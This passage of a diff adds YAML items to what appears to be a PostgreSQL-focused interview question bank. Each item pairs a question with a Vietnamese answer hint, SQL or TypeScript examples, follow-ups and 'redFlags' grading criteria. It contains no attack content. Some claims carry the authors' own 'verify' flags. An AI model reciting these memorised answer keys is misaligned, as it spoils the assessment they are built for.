+    tags: [delete, replication, wal]
+    verify: true
+  - id: scenario-data-030
+    level: medium
+    type: compare
+    q: >-
+      Your notes say "DROP PARTITION p_2022 is O(1) and doesn't lock the table". Correct that for PostgreSQL and compare the ways to remove a year of data.
+    hint: |-
+      `DROP PARTITION` là cú pháp **MySQL**. Postgres: partition là một bảng → `DROP TABLE orders_2022` hoặc `ALTER TABLE orders DETACH PARTITION orders_2022` rồi drop/archive. Nhanh vì chỉ xoá file, không sinh WAL theo row, không bloat.
+      Nhưng **có lock**: DROP/DETACH thường cần `ACCESS EXCLUSIVE` trên bảng cha trong thời gian ngắn → xếp hàng sau query dài và **chặn mọi query sau nó** (lock queue). Dùng `DETACH PARTITION ... CONCURRENTLY` (PG14+, không chạy trong transaction block, không dùng khi có default partition) + `lock_timeout`.
+      So sánh: batched DELETE (không cần schema mới, tốn WAL/bloat) · partition drop (tức thì, cần thiết kế trước, PK phải chứa partition key) · copy-keepers + swap (khi giữ lại ít) · `TRUNCATE` (xoá hết bảng/partition, cũng cần ACCESS EXCLUSIVE).
+    example: |-
+      ```sql
+      SET lock_timeout = '3s';
+      ALTER TABLE orders DETACH PARTITION orders_2022 CONCURRENTLY;
+      -- archive: COPY orders_2022 TO STDOUT ... → S3, rồi:
+      DROP TABLE orders_2022;
+      ```
+    followUp: How do you convert an existing 500M-row non-partitioned table into a partitioned one without downtime?
+    redFlags:
+      - "Uses MySQL partition syntax in a Postgres answer"
+      - "Claims no lock at all is taken"
+    tags: [delete, partitioning, postgres, mysql]
+    verify: true
+  - id: scenario-data-031
+    level: medium
+    type: gotcha
+    q: >-
+      You deleted 60% of a 900 GB table. The disk graph did not move and some queries are not faster. Explain, and what are your options?
+    hint: |-
+      MVCC: DELETE chỉ đánh dấu tuple chết. `VACUUM` thường đánh dấu space **tái sử dụng được** trong file (free space map), chỉ trả OS phần trang trống **ở cuối file**. Index cũng giữ entry chết tới khi vacuum dọn, và page index nửa rỗng vẫn nằm đó → **bloat** → scan đọc nhiều page hơn cần.
+      Lựa chọn: (1) chấp nhận — insert mới sẽ dùng lại space; (2) `REINDEX INDEX CONCURRENTLY` cho index bloat (PG12+); (3) `VACUUM FULL`/`CLUSTER` viết lại bảng nhưng giữ **ACCESS EXCLUSIVE** suốt thời gian → gần như downtime; (4) **pg_repack** / pg_squeeze viết lại online (chỉ lock ngắn cuối, cần gấp đôi dung lượng tạm).
+      Đo trước: `pgstattuple` hoặc query ước lượng bloat; sau đó `ANALYZE` để planner biết số row mới.
+    followUp: pg_repack needs extra disk. You only have 15% free. What now?
+    redFlags:
+      - "Runs VACUUM FULL on the primary during business hours"
+    tags: [delete, vacuum, bloat]
+  - id: scenario-data-032
+    level: senior
+    type: design
+    q: >-
+      A 400M-row `events` table must keep only the last 30 days (about 5% of rows) from now on, with less than a minute of write interruption.
+      Design the migration.
+    hint: |-
+      Xoá 95% bằng DELETE = tệ nhất (WAL khổng lồ, bloat) → **copy keepers + swap**, và nhân tiện chuyển sang **partitioned table** để retention sau này là `DROP`.
+      Bước: (1) tạo `events_new` partition theo ngày (PK gồm `created_at`), tạo sẵn partition 30 ngày + tương lai; (2) **dual-write** (trigger trên bảng cũ hoặc app ghi cả hai) cho row mới; (3) copy 30 ngày gần nhất theo batch keyset, `ON CONFLICT DO NOTHING` để trùng với dual-write không sao; (4) verify count/checksum theo ngày; (5) cutover trong transaction ngắn với `lock_timeout`: `ALTER TABLE events RENAME TO events_old; ALTER TABLE events_new RENAME TO events;` + sequence, view, grant, FK trỏ tới; (6) giữ `events_old` vài ngày để rollback, rồi `DROP`.
+      Rủi ro: FK từ bảng khác trỏ vào `events`, view/function tham chiếu theo OID (view đi theo bảng cũ khi rename!), ORM cache, replica/CDC slot thấy DDL, sequence ownership.
+      Job retention: tạo partition trước (pg_partman hoặc cron), detach + drop partition > 30 ngày hằng đêm.
+    followUp: A view `v_recent_events` referenced the old table. After the rename, what does it point to?
+    redFlags:
+      - "Plans a single `DELETE WHERE created_at < now() - interval '30 days'`"
+    tags: [partitioning, migration, retention]
+  - id: scenario-data-033
+    level: hard
+    type: design
+    q: >-
+      Write the core loop of a backfill job that sets `orders.region_code` for 100M rows. It must be resumable after a crash, throttle itself,
+      and be safe to run while the app keeps writing.
+    hint: |-
+      Nguyên tắc: **keyset theo PK range** (không `OFFSET`, không `WHERE region_code IS NULL` quét lại từ đầu), mỗi batch **một transaction ngắn**, **checkpoint** sau mỗi batch trong một bảng `job_checkpoints`, idempotent (`WHERE region_code IS NULL` trong batch để chạy lại không ghi đè giá trị app vừa set).
+      Throttle: sleep giữa batch, đợi replica lag, **adaptive batch size** (batch > 500 ms thì giảm, < 100 ms thì tăng).
+      An toàn khi app đang ghi: app đã **dual-write** cột mới trước khi backfill; batch nhỏ → lock row ngắn; `lock_timeout` để không chờ lâu sau row đang bị lock.
+      Cuối: kiểm tra `count(*) WHERE region_code IS NULL` = 0 (trên replica), rồi mới thêm `NOT NULL` (qua `CHECK ... NOT VALID` + `VALIDATE CONSTRAINT` để tránh lock dài).
+    example: |-
+      ```ts
+      let { last_id: lastId } = await getCheckpoint("backfill_region");
+      let size = 5000;
+      for (;;) {
+        const t0 = Date.now();
+        const { rows } = await db.query(`
+          WITH b AS (SELECT id FROM orders WHERE id > $1 ORDER BY id LIMIT $2)
+          UPDATE orders o SET region_code = r.code
+          FROM b JOIN addresses a ON a.order_id = b.id JOIN regions r ON r.zip = a.zip
+          WHERE o.id = b.id AND o.region_code IS NULL
+          RETURNING (SELECT max(id) FROM b) AS max_id`, [lastId, size]);
+        const maxId = rows[0]?.max_id ?? (await maxIdAfter(lastId, size));
+        if (maxId == null) break;               // no more rows
+        lastId = maxId;
+        await saveCheckpoint("backfill_region", lastId);
+        const ms = Date.now() - t0;
+        size = ms > 500 ? Math.max(500, size / 2) : ms < 100 ? Math.min(20000, size * 2) : size;
+        await waitForReplicas(5000);
+        await sleep(100);
+      }
+      ```
+    followUp: >-
+      Halfway through, product changes the region mapping for 3 zip codes. How do you handle rows the job already backfilled?
+    redFlags:
+      - "One UPDATE for all 100M rows"
+      - "No checkpoint — restarts from id 0 after a crash"
+    tags: [backfill, batch, resumable]
+  - id: scenario-data-034
+    level: medium
+    type: debug
+    q: >-
+      This backfill starts at 50 ms per batch and after a few hours each batch takes 20 seconds. Why does it get slower over time?
+    hint: |-
+      `WHERE region_code IS NULL LIMIT 5000` không có index phù hợp → mỗi batch **seq scan từ đầu bảng**, phải đi qua toàn bộ row **đã xử lý** (và dead tuple do UPDATE tạo ra) mới tới 5.000 row còn NULL → chi phí tăng dần theo tiến độ, O(n²) tổng.
+      Fix: (1) keyset theo PK range (`id > $last ORDER BY id LIMIT n`) + checkpoint → mỗi batch chi phí hằng số;
+      (2) nếu phải tìm theo điều kiện, tạo **partial index** `ON orders (id) WHERE region_code IS NULL` (index co lại khi backfill tiến triển); (3) theo dõi autovacuum theo kịp số dead tuple.
+      Con số: batch cuối của cách cũ phải đọc ~toàn bảng (100M row) để tìm 5.000 row; keyset chỉ đọc đúng 5.000 row mỗi lần.
+    example: |-
+      ```sql
+      -- BUG
+      UPDATE orders SET region_code = compute_region(zip)
+      WHERE id IN (SELECT id FROM orders WHERE region_code IS NULL LIMIT 5000);
+
+      -- FIX
+      UPDATE orders SET region_code = compute_region(zip)
+      WHERE id > $1 AND id <= $1 + 5000 AND region_code IS NULL;
+      ```
+    followUp: Your ids are UUIDv4, not sequential. How do you batch by key range now?
+    redFlags:
+      - "Says the database is just getting tired and needs a restart"
+    tags: [backfill, debug, index]
+  - id: scenario-data-035
+    level: easy
+    type: scenario
+    q: >-
+      A query that took 50 ms yesterday takes 5 seconds today. No deploy, same SQL. What are the first three things you look at?
+    hint: |-
+      Nguyên tắc: "SQL không đổi ≠ điều kiện chạy không đổi" — data, statistics, plan, lock, tài nguyên đều có thể đổi.
+      (1) **Chỉ query này hay mọi query?** Mọi query chậm → tài nguyên (CPU, IOPS throttling, disk gần đầy, backup/vacuum đang chạy). (2) **`pg_stat_activity`**: query đang `active` hay chờ (`wait_event_type = Lock/IO/LWLock`)? Có session `idle in transaction` lâu không? (3) **`EXPLAIN (ANALYZE, BUFFERS)`** so với plan cũ (`auto_explain`/log): plan đổi? estimate lệch actual? `shared read` cao (cold cache)?
+      Song song: `pg_stat_statements` để thấy `mean_exec_time` tăng từ lúc nào, và metric app (pool wait time) để loại trừ chậm **ngoài** DB.
+    followUp: The plan is identical to yesterday's but `shared read` went from 200 to 90,000 buffers. What does that tell you?
+    redFlags:
+      - "Immediately adds an index without looking at the plan"
+      - "Restarts the database"
+    tags: [slow-query, triage]
+  - id: scenario-data-036
+    level: hard
+    type: debug
+    q: >-
+      A Node service uses named prepared statements. The query is fast for the first five calls after a pod starts, then suddenly takes 3 seconds for
+      large tenants. `EXPLAIN ANALYZE` in psql with literal values is fast. What is happening?
+    hint: |-
+      Postgres plan cache: với prepared statement, 5 lần đầu planner tạo **custom plan** theo giá trị tham số thật; từ lần 6 nó so sánh chi phí ước lượng của **generic plan** (không biết giá trị) với trung bình custom plan và có thể **chuyển sang generic** nếu không tệ hơn nhiều. Generic plan tối ưu cho tenant "trung bình" → tệ với tenant 10M row (data skew). psql với literal luôn là custom plan → không tái hiện được.
+      Xác nhận: `PREPARE` + chạy 6 lần + `EXPLAIN EXECUTE` thấy tham số dạng `$1` trong plan = generic.
+      Fix: `SET plan_cache_mode = force_custom_plan` cho session/role/transaction của query đó (PG12+), hoặc không dùng named statement cho query này, hoặc tách query cho tenant lớn. Đây là **analog Postgres của parameter sniffing**, không phải cùng cơ chế.
+    example: |-
+      ```ts
+      // pg: a `name` makes it a server-side prepared statement cached per connection
+      await client.query({
+        name: "orders-by-tenant",
+        text: "SELECT * FROM orders WHERE tenant_id = $1 AND status = $2 ORDER BY created_at DESC LIMIT 50",
+        values: [tenantId, status],
+      });
+      ```
+      ```sql
+      PREPARE q(bigint, text) AS SELECT ... WHERE tenant_id = $1 AND status = $2 ...;
+      EXECUTE q(7, 'open');  -- ×6
+      EXPLAIN EXECUTE q(42, 'open');  -- "Index Cond: (tenant_id = $1)" → generic plan
+      ```
+    followUp: PgBouncer in transaction mode sits between the app and the database. How does that change prepared statement behavior?
+    redFlags:
+      - "Calls it 'parameter sniffing in Postgres' and suggests OPTION (RECOMPILE)"
+    tags: [slow-query, prepared-statements, plan-cache]
+    verify: true
+  - id: scenario-data-037
+    level: medium
+    type: compare
+    q: >-
+      You come from SQL Server. Compare parameter sniffing there with plan caching in Postgres, and list the fixes you'd reach for on each side.
+    hint: |-
+      **SQL Server**: stored procedure/parameterized query được compile **lần đầu** với giá trị tham số lúc đó ("sniff") và plan được cache dùng chung → giá trị đầu là tenant nhỏ thì tenant lớn dùng plan nested loop tệ. Fix: `OPTION (RECOMPILE)`, `OPTIMIZE FOR (@p = ...)`/`OPTIMIZE FOR UNKNOWN`, **Query Store plan forcing**, tách procedure theo nhánh, **Parameter Sensitive Plan optimization** (SQL Server 2022, nhiều plan theo khoảng giá trị — verify).
+      **Postgres**: không có plan cache dùng chung giữa session; chỉ prepared statement **trong một connection**; 5 custom plan rồi có thể sang generic. Fix: `plan_cache_mode`, bỏ named statement, extended statistics, viết query khác cho outlier.
+      MySQL: không có hiện tượng này theo nghĩa đó; và **query cache đã bị xoá ở MySQL 8.0** — "query cache invalidated" không phải nguyên nhân với MySQL hiện đại.
+    followUp: Query Store shows two plans for the same query with a 50x duration difference. How do you decide whether to force one?
+    tags: [slow-query, sql-server, plan-cache, compare]
+    verify: true
+  - id: scenario-data-038
+    level: hard
+    type: scenario
+    q: >-
+      After a nightly bulk load of 20M rows into a 1B-row table, the morning dashboards are slow. The plan shows `rows=1200` estimated vs `rows=4,800,000` actual.
+      Explain and fix, now and for the future.
+    hint: |-
+      Statistics cũ: autoanalyze chỉ chạy khi số row thay đổi > `autovacuum_analyze_threshold` (50) + `autovacuum_analyze_scale_factor` (0,1) × reltuples → với 1B row cần **~100M thay đổi** mới analyze → 20M row mới (nằm hết ở khoảng ngày mới, ngoài histogram) bị ước lượng gần 0 → planner chọn nested loop/index scan sai.
+      Ngay: `ANALYZE orders;` (nhẹ, sample) → plan trở lại.
+      Lâu dài: job load gọi `ANALYZE` ở cuối; per-table `ALTER TABLE ... SET (autovacuum_analyze_scale_factor = 0.005)` cho bảng lớn; tăng `default_statistics_target`/per-column statistics cho cột skew; `CREATE STATISTICS` (dependencies/ndistinct/mcv) cho cột tương quan (`country`, `city`); partition theo thời gian để partition mới có stats riêng.
+    example: |-
+      ```sql
+      SELECT relname, n_mod_since_analyze, last_autoanalyze, last_analyze
+      FROM pg_stat_user_tables WHERE relname = 'orders';
+
+      ALTER TABLE orders SET (autovacuum_analyze_scale_factor = 0.005, autovacuum_analyze_threshold = 10000);
+      CREATE STATISTICS orders_country_city (dependencies, mcv) ON country, city FROM orders;
+      ANALYZE orders;
+      ```
+    followUp: Does ANALYZE take locks or block writes? Is it safe to run at 10am on the primary?
+    redFlags:
+      - "Runs VACUUM FULL to 'refresh statistics'"
+    tags: [slow-query, statistics, autovacuum]
+  - id: scenario-data-039
+    level: hard
+    type: scenario
+    q: >-
+      Over the last six hours, all queries on hot tables got gradually slower and `n_dead_tup` keeps climbing even though autovacuum runs constantly.
+      You find one session in state `idle in transaction` since 04:12. Explain and fix.
+    hint: |-
+      Session mở transaction rồi không commit (bug quên `COMMIT`/`release`, lỗi giữa chừng không rollback, người chạy tay trong psql). Snapshot của nó giữ **xmin horizon** → VACUUM **không được xoá** bất kỳ dead tuple nào mới hơn 04:12 trên **toàn cluster** → bloat tăng, index scan đi qua nhiều version, HOT update thất bại. Có thể còn giữ lock chặn DDL.
+      Tìm: `pg_stat_activity` với `state = 'idle in transaction'`, `xact_start`, `backend_xmin`; cũng kiểm tra replication slot và prepared transactions (`pg_prepared_xacts`) — cũng giữ xmin.
+      Fix: `pg_terminate_backend(pid)` (sau khi biết là gì); guardrail `idle_in_transaction_session_timeout` (vd 60s) cho role app, `transaction_timeout` (PG17+, verify); code: luôn `try/finally` release, không gọi HTTP bên ngoài trong transaction.
+    example: |-
+      ```sql
+      SELECT pid, usename, application_name, state, xact_start, backend_xmin,
+             now() - xact_start AS age, left(query, 80) AS last_query
+      FROM pg_stat_activity
+      WHERE state LIKE 'idle in transaction%'
+      ORDER BY xact_start;
+      ALTER ROLE app SET idle_in_transaction_session_timeout = '60s';
+      ```
+    followUp: After you kill it, autovacuum catches up but the tables stay large. Why, and does that matter?
+    redFlags:
+      - "Increases autovacuum workers and waits"
+    tags: [slow-query, mvcc, vacuum, idle-in-transaction]
+    verify: true
+  - id: scenario-data-040
+    level: medium
+    type: scenario
+    q: >-
+      API p99 went from 150 ms to 4 s. `pg_stat_statements` shows the endpoint's queries still average 8 ms and DB CPU is at 20%.
+      Where is the time going?
+    hint: |-
+      Thời gian nằm **ngoài execution trong DB**: (1) **chờ connection từ pool** — pool cạn do query/transaction khác giữ lâu, connection leak, hoặc số instance × pool size > `max_connections`; (2) **lock wait** — `pg_stat_statements` có tính thời gian chờ lock trong exec time, nên nếu mean thấp thì ít khả năng, nhưng p99 có thể bị che bởi trung bình; (3) **N+1** — 8 ms × 400 query = 3,2 s; (4) event loop Node bị block (JSON lớn, CPU).
+      Đo: metric pool (`waitingCount`, thời gian acquire), trace span theo query, số query mỗi request, event loop lag.
+      Fix theo nguyên nhân: timeout khi acquire (fail fast), fix leak (`finally release`), PgBouncer/RDS Proxy, gộp query.
+    followUp: How do you size a pg Pool for 12 pods against a database with `max_connections = 200`?
+    redFlags:
+      - "Concludes the database is fine so the problem must be the network"
+    tags: [slow-query, connection-pool, n-plus-one]
+  - id: scenario-data-041
+    level: hard
+    type: output
+    q: >-
+      Read this `EXPLAIN (ANALYZE, BUFFERS)` output for a "latest open orders for a tenant" query. What is wrong and what would you change?
+    hint: |-
+      Đọc: (1) estimate `rows=50` vs actual `rows=1.902.114` ở Bitmap → **estimate lệch 38.000 lần**; (2) `Rows Removed by Filter: 1.9M` → index `(tenant_id)` chọn nhiều row, lọc `status` sau khi đọc heap; (3) `Buffers: read=412k` → ~3,2 GB đọc từ disk (8 KB/page), cold; (4) `Sort Method: top-N heapsort` trên 1,9M row chỉ để lấy 50.
+      Fix: index **khớp cả WHERE và ORDER BY** `(tenant_id, status, created_at DESC)` hoặc **partial** `(tenant_id, created_at DESC) WHERE status = 'open'` → Index Scan dừng sau 50 row, không sort. Sau đó `ANALYZE` và cân nhắc `CREATE STATISTICS` nếu `tenant_id`/`status` tương quan.
+      Kết quả kỳ vọng: vài chục buffer, vài ms.
+    example: |-
+      ```text
+      Limit (actual time=5210.4..5210.5 rows=50 loops=1)
+        Buffers: shared hit=1033 read=412871
+        -> Sort (actual rows=50) Sort Key: created_at DESC  Sort Method: top-N heapsort  Memory: 39kB
+          -> Bitmap Heap Scan on orders (cost=.. rows=50 ..) (actual rows=1902114 loops=1)
+                Recheck Cond: (tenant_id = 42)
+                Filter: (status = 'open')
+                Rows Removed by Filter: 1899870
+                -> Bitmap Index Scan on orders_tenant_id_idx (actual rows=3801984)
+      Planning Time: 0.3 ms
+      Execution Time: 5211.0 ms
+      ```
+    followUp: After adding the index, the plan uses it but still shows `Heap Fetches` in the thousands. Why?
+    redFlags:
+      - "Focuses on the Sort node because it is at the top"
+    tags: [slow-query, explain, index]
+  - id: scenario-data-042
+    level: hard
+    type: debug
+    q: >-
+      A deploy ran the migration below at 11:00. Within seconds every request touching `orders` timed out, even simple `SELECT`s, and the migration itself
+      was 'waiting'. The column add is supposed to be instant. What happened?
+    hint: |-
+      `ALTER TABLE ... ADD COLUMN` (không default volatile) chỉ đổi catalog — **nhanh**, nhưng cần lock **`ACCESS EXCLUSIVE`**. Có một query báo cáo chạy 10 phút đang giữ `ACCESS SHARE` → ALTER phải **chờ**. Lock queue của Postgres là FIFO: mọi `SELECT` đến sau (cần `ACCESS SHARE`, xung đột với ALTER đang chờ) **xếp hàng sau ALTER** → cả bảng đứng.
+      Chẩn đoán: `pg_stat_activity` + `pg_blocking_pids(pid)` thấy chuỗi: SELECTs ← ALTER ← report query.
+      Fix: mọi migration đặt **`SET lock_timeout = '3s'`** và retry với backoff; `statement_timeout` cho query báo cáo trên primary (hoặc chạy trên replica); chạy DDL giờ thấp điểm. Ngay lúc sự cố: cancel migration (giải phóng hàng đợi) hoặc cancel query báo cáo.
+    example: |-
+      ```sql
+      -- migration (BUG: no lock_timeout)
+      ALTER TABLE orders ADD COLUMN region_code text;
+
+      -- FIX
+      SET lock_timeout = '3s';
+      ALTER TABLE orders ADD COLUMN region_code text;   -- retry on lock_not_available (55P03)
+
+      -- who blocks whom
+      SELECT pid, pg_blocking_pids(pid) AS blocked_by, wait_event_type, state, left(query, 60)
+      FROM pg_stat_activity WHERE datname = current_database() AND wait_event_type = 'Lock';
+      ```
+    followUp: Which other common DDL statements take ACCESS EXCLUSIVE, and which have a concurrent alternative?
+    redFlags:
+      - "Says a metadata-only change can't cause an outage"
+    tags: [slow-query, locks, migrations, debug]
+  - id: scenario-data-043
+    level: medium
+    type: debug
+    q: >-
+      There is an index on `orders (status, created_at)`. This query for the last 7 days is still slow and sorts in memory. Explain precisely why the index doesn't help
+      and fix it.
+    hint: |-
+      **Leftmost prefix**: B-tree `(status, created_at)` sắp theo `status` trước, trong mỗi `status` mới sắp theo `created_at`. Query không có điều kiện trên `status` → không thể **seek** vào một khoảng liên tục của `created_at`; `created_at` chỉ có thứ tự **bên trong từng status** nên `ORDER BY created_at` toàn cục cũng không được thoả → phải sort.
+      Planner có thể vẫn full-scan index (nếu nhỏ hơn heap) nhưng đó là scan, không phải seek. PostgreSQL 18 có **B-tree skip scan**: khi cột đầu ít giá trị distinct, planner có thể "nhảy" qua từng `status` — giúp phần WHERE, nhưng vẫn không cho thứ tự toàn cục (verify).
+      Fix: index `(created_at)` (hoặc `(created_at DESC)`; B-tree scan ngược được) cho query này; nếu luôn lọc thêm tenant thì `(tenant_id, created_at)`. Nếu query thật lọc `status IN (...)` thì giữ `(status, created_at)` và thêm `status` vào WHERE.
+    example: |-
+      ```sql
+      CREATE INDEX idx_orders ON orders (status, created_at);
+      SELECT id, total FROM orders
+      WHERE created_at >= now() - interval '7 days'
+      ORDER BY created_at DESC
+      LIMIT 100;
+      -- FIX
+      CREATE INDEX CONCURRENTLY orders_created_at_idx ON orders (created_at);
+      ```
+    followUp: In SQL Server, would the same index help? What would the plan show?
+    redFlags:
+      - "Says the index 'doesn't help ORDER BY' without explaining the ordering of a composite B-tree"
+    tags: [index, composite, leftmost-prefix]
+    verify: true
+  - id: scenario-data-044
+    level: easy
+    type: gotcha
+    q: >-
+      `WHERE DATE(created_at) = '2026-09-01'` and `WHERE lower(email) = $1` both ignore their indexes. Why, and what are the two fixes?
+    hint: |-
+      Index lưu giá trị **cột gốc**; khi bọc cột trong function/cast (`DATE(...)`, `created_at::date`, `lower(email)`, so sánh `varchar` với tham số `text`/`nvarchar` kiểu khác ở SQL Server) planner không map được điều kiện về index → seq scan.
+      Fix 1 — viết lại thành **range sargable**: `created_at >= '2026-09-01' AND created_at < '2026-09-02'` (chú ý timezone của `timestamptz`).
+      Fix 2 — **expression index** khớp đúng biểu thức: `CREATE INDEX ON users (lower(email))` — query phải viết y hệt; hoặc dùng `citext`.
+      SQL Server: implicit conversion `nvarchar` → `varchar` column là nguyên nhân kinh điển của scan.
+    followUp: Your app sends timestamps in UTC but the business day is in Asia/Ho_Chi_Minh. Rewrite the date filter correctly.
+    tags: [index, sargable]
+  - id: scenario-data-045
+    level: hard
+    type: scenario
+    q: >-
+      You added a covering index for a hot count/list query and the plan says `Index Only Scan`, yet it is barely faster and shows `Heap Fetches: 850000`.
+      Why, and what do you do?
+    hint: |-
+      Index Postgres không chứa thông tin visibility. Index-only scan chỉ bỏ qua heap cho page được đánh dấu **all-visible** trong **visibility map**; page có thay đổi gần đây (chưa vacuum) → vẫn phải đọc heap để check visibility → `Heap Fetches` cao. Bảng ghi nhiều hoặc vacuum chậm → IOS gần như index scan thường.
+      Fix: vacuum thường xuyên hơn cho bảng đó (`autovacuum_vacuum_scale_factor` nhỏ; PG13+ có insert-triggered vacuum cho bảng append-only), tránh transaction dài giữ xmin, dùng `INCLUDE (...)` (PG11+) để cột phụ nằm ở leaf mà không làm rộng key; kiểm tra lại sau `VACUUM`.
+      Trade-off: index rộng hơn → write chậm hơn, mất HOT update nếu cột được include bị update thường xuyên.
+    example: |-
+      ```sql
+      CREATE INDEX CONCURRENTLY orders_tenant_created_incl
+        ON orders (tenant_id, created_at DESC) INCLUDE (status, total);
+      VACUUM (ANALYZE) orders;
+      EXPLAIN (ANALYZE, BUFFERS)
+      SELECT created_at, status, total FROM orders WHERE tenant_id = 42 ORDER BY created_at DESC LIMIT 50;
+      -- Index Only Scan ... Heap Fetches: 0
+      ```
+    followUp: Why can adding `status` to an index make updates of `status` more expensive even if the query gets faster?
+    redFlags:
+      - "Thinks 'Index Only Scan' in the plan guarantees no heap access"
+    tags: [index, covering-index, visibility-map]
+  - id: scenario-data-046
+    level: hard
+    type: debug
+    q: >-
+      This report joins `orders` to `customers` filtered by `country = 'VN' AND city = 'Hanoi'`. The planner picks a Nested Loop that runs for minutes.
+      Both columns are indexed and statistics are fresh. What's wrong?
+    hint: |-
+      Planner mặc định coi các điều kiện **độc lập**: selectivity(country) × selectivity(city). Nhưng `city = 'Hanoi'` **kéo theo** `country = 'VN'` → nhân hai lần → estimate nhỏ hơn thực tế hàng trăm lần → chọn Nested Loop cho vài row nhưng thực tế là hàng triệu vòng lặp.
+      Fix: `CREATE STATISTICS ... (dependencies, mcv) ON country, city FROM customers; ANALYZE customers;` → planner biết tương quan. Nếu vẫn sai: bỏ điều kiện dư thừa (`country` khi đã có `city`), tăng statistics target, hoặc tách query/CTE `MATERIALIZED` làm hàng rào.
+      Xác nhận bằng `EXPLAIN ANALYZE`: estimate vs actual ở node scan `customers`.
+    example: |-
+      ```text
+      Nested Loop (cost=1.1..950.2 rows=12) (actual time=0.1..184220.7 rows=2210034 loops=1)
+        -> Index Scan using customers_city_idx on customers (rows=3) (actual rows=48210)
+              Index Cond: (city = 'Hanoi')  Filter: (country = 'VN')
+        -> Index Scan using orders_customer_id_idx on orders (rows=4) (actual rows=46 loops=48210)
+      ```
+      ```sql
+      CREATE STATISTICS customers_country_city (dependencies, mcv) ON country, city FROM customers;
+      ANALYZE customers;
+      ```
+    followUp: Why is `SET enable_nestloop = off` in production code a bad long-term fix?
+    redFlags:
+      - "Adds planner hints via an extension as the first move"
+    tags: [slow-query, statistics, planner, debug]
+  - id: scenario-data-047
+    level: medium
+    type: scenario
+    q: >-
+      Orders live in Postgres, product reviews and ratings live in MongoDB. A new screen lists orders with each product's average rating, filterable by
+      "rating >= 4" and sorted by rating. How do you build it?
+    hint: |-
+      Hỏi: latency SLA, tần suất rating đổi, có cần filter/sort theo rating không (có → **không thể** làm API composition cho đúng khi phân trang).
+      - **API composition** (query Postgres lấy 50 order → gom product id → 1 query Mongo `$in` → merge): được khi chỉ **hiển thị** thêm field, không filter/sort theo nó. Phải xử lý Mongo chậm/lỗi (timeout, trả rating null).
+      - **Filter/sort theo dữ liệu của DB kia** → cần **read model**: chọn source of truth cho từng dữ liệu (order: Postgres, rating: Mongo), đồng bộ `avg_rating` về chỗ đọc (cột denormalize trong Postgres, hoặc document `order_view` trong Mongo/Elasticsearch) qua **outbox/CDC**, chấp nhận eventual consistency vài giây.
+      - Cross-DB join tại runtime (fetch toàn bộ rồi join trong app) chỉ dành cho **batch/report**, không cho API online.
+    followUp: The rating in the list is 30 seconds behind the product page. Product calls it a bug. How do you respond?
+    redFlags:
+      - "Loads all orders and all reviews into memory and joins them per request"
+      - "Proposes a distributed transaction across the two databases"
+    tags: [cqrs, read-model, polyglot]
+  - id: scenario-data-048
+    level: senior
+    type: design
+    q: >-
+      Design the pipeline that keeps a denormalized `order_view` (Elasticsearch) in sync with Postgres (orders, items, customers) and Mongo (ratings).
+      Cover ordering, backfill, rebuild and how you know it is correct.
+    hint: |-
+      Nguồn thay đổi: **transactional outbox** trong Postgres (event nghiệp vụ, ghi cùng transaction) hoặc **CDC** (Debezium đọc WAL qua logical replication slot); Mongo dùng **change streams**. Đẩy vào Kafka, key theo `order_id` → thứ tự trong một order được giữ.
+      Consumer: **idempotent upsert** theo `order_id` với **version** (`updated_at`/LSN) → bỏ event cũ đến trễ (không overwrite bản mới bằng bản cũ). Event thiếu dữ liệu → "fetch latest from source" thay vì tin payload.
+      Backfill/rebuild: build index mới `order_view_v2` từ snapshot + replay từ offset đã ghi nhận lúc snapshot, rồi chuyển **alias** (zero downtime).
+      Đúng: reconciliation job so count/checksum theo ngày giữa nguồn và view; metric lag (event time → indexed time) với SLO (vd p99 < 5s); DLQ cho event lỗi.
+      Rủi ro: slot CDC chết giữ WAL → đầy disk primary (alert trên `pg_replication_slots`).
+    followUp: A customer's name changes and 200,000 of their orders must be reindexed. How does your pipeline handle that fan-out?
+    redFlags:
+      - "Dual-writes to Postgres and Elasticsearch from the request handler with no outbox"
+    tags: [cqrs, cdc, outbox, elasticsearch]
+    verify: true
+  - id: scenario-data-049
+    level: medium
+    type: scenario
+    q: >-
+      The finance dashboard runs a 30-second aggregation over 18 months of orders on the primary. When three people open it, checkout latency spikes.
+      What are your options, from quickest to most robust?
+    hint: |-
+      Ngay: `statement_timeout` cho role/endpoint dashboard, cache kết quả vài phút, và chuyển query sang **read replica** (hoặc replica riêng cho reporting).
+      Trung hạn: **pre-aggregate** — summary table `daily_revenue(tenant_id, day, ...)` cập nhật incremental (job mỗi 5 phút chỉ tính lại ngày hôm nay) hoặc **materialized view** + `REFRESH ... CONCURRENTLY`; dashboard chỉ đọc vài trăm row.
+      Dài hạn: **OLAP/warehouse** (columnar: Redshift, BigQuery, ClickHouse...) nạp qua CDC/ETL, tách hoàn toàn tải analytics khỏi OLTP.
+      Trade-off: replica có lag và query conflict; summary table stale vài phút và phải xử lý sửa dữ liệu lùi ngày (refund tháng trước); warehouse tốn hạ tầng.
+    followUp: A refund is issued today for an order from 5 months ago. How does your summary table stay correct?
+    redFlags:
+      - "Adds more indexes on the primary until the aggregation is fast"
+    tags: [reporting, replica, materialized-view]
+  - id: scenario-data-050
+    level: hard
+    type: gotcha
+    q: >-
+      You moved the dashboard to a materialized view refreshed every 5 minutes with `REFRESH MATERIALIZED VIEW sales_mv`. Now the dashboard hangs for 40 seconds
+      every 5 minutes. Why, and what are the alternatives?
+    hint: |-
+      `REFRESH MATERIALIZED VIEW` (không CONCURRENTLY) lấy lock **ACCESS EXCLUSIVE** trên MV → mọi `SELECT` chờ tới khi refresh xong.
+      `REFRESH ... CONCURRENTLY`: không chặn reader, nhưng cần **unique index** trên MV (trên cột, không có WHERE), chậm hơn (tính lại toàn bộ rồi diff), sinh WAL/bloat cho các row đổi; vẫn không thể chạy hai refresh cùng lúc.
+      Cả hai đều **tính lại toàn bộ** query → chi phí không giảm khi data lớn dần. Thay thế: summary table **incremental** (upsert chỉ khoảng thời gian thay đổi), hoặc hai bảng A/B + swap, hoặc warehouse.
+    example: |-
+      ```sql
+      CREATE UNIQUE INDEX ON sales_mv (tenant_id, day);
+      REFRESH MATERIALIZED VIEW CONCURRENTLY sales_mv;
+
+      -- incremental alternative
+      INSERT INTO daily_sales (tenant_id, day, revenue, orders)
+      SELECT tenant_id, created_at::date, sum(total), count(*)
+      FROM orders WHERE created_at >= current_date - 1
+      GROUP BY 1, 2
+      ON CONFLICT (tenant_id, day) DO UPDATE SET revenue = EXCLUDED.revenue, orders = EXCLUDED.orders;
+      ```
+    followUp: The incremental job recomputes 'yesterday and today'. What late-arriving data breaks it and how do you detect that?
+    redFlags:
